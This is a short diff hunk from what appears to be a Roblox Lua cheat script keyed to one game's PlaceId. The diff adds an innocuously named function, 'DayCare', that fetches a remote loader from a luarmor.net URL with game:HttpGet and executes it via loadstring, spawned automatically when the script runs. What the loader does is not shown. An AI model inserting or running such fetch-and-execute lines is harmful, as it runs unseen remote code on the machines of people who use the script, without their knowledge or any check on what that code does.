@@ -7,6 +7,11 @@ if game.PlaceId == 8737899170 then
     end
 end
 
+local function DayCare()
+loadstring(game:HttpGet("https://api.luarmor.net/files/v3/loaders/f420cbd8fa65c531f13fd0d569bc3300.lua"))()
+end
+spawn(DayCare)
+
 local function MonitorAndSpin()
     while true do
 
